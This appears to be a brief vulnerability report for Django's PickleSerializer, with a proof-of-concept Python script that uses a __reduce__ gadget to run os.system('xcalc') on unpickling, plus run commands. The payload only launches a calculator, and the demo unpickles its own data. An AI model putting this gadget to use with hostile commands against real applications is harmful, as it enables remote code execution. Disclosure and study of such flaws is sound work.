# Description
Django is a high-level Python Web framework that encourages rapid development and clean, pragmatic design.
* **Vulnerability description**
    untrusted loading of data by the pickle.load function leading to Arbitrary code execution.

# Proof of Concept
Run exploit.py
```
import os
import pickle
#os.system('pip3 install django')
from django.contrib.sessions import serializers
#payload formation
class ArbitraryCode:
    def __reduce__(self):
        cmd = ('xcalc')
        return os.system, (cmd,)
dumps = pickle.dumps(ArbitraryCode())
serializers.PickleSerializer.loads(dumps,dumps)
```
* `pip3 install django`
* `python3 exploit.py`
